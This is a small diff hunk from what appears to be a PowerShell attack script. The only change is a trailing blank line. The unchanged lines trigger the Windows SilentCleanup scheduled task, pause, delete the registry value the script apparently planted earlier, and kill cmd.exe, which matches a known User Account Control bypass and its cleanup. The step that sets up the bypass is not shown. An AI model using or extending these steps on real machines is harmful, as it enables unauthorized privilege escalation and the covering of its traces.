@@ -8,3 +8,4 @@ schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
 sleep 2
 Remove-ItemProperty -Path $registryPath -Name $name
 taskkill /f /im cmd.exe
+
